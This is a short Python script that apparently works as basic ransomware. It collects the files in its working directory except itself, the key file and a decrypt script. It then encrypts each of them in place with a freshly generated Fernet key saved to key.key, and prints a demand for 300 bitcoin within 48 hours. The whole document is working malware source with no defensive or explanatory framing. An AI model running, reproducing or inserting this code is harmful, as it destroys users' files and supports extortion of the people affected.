import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
        if file == "ransome.py" or file == "key.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)


key = Fernet.generate_key()

with open("key.key", "wb") as thekey:
        thekey.write(key)


for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)



print("ALL OF YOUR FILES HAVE BEEN DELETED, YOU HAVE 48 HOURS TO SEND ME 300 BITCOIN")
